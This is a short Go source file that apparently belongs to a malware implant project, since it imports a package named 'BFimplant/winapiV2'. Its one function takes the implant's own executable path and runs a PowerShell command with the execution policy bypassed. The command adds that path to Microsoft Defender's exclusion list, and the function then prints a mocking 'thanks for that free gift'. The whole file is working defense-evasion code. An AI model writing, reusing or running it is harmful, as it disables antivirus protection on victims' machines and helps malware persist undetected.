package per

import (
	"fmt"
    "BFimplant/winapiV2"
)

func Add_excep() {
    exePath := GetExecutablePath()

    comm := `powershell -ExecutionPolicy Bypass Add-MpPreference -Force -ExclusionPath "`+exePath+`"`
    m , err := winapiV2.Exec(comm)

    if err != nil {	
        fmt.Printf("Error creating shortcut: %v\nOutput: %s\n", err, "")
        return
    }
    fmt.Println(m)
    fmt.Println("thanks for that free gift")
}

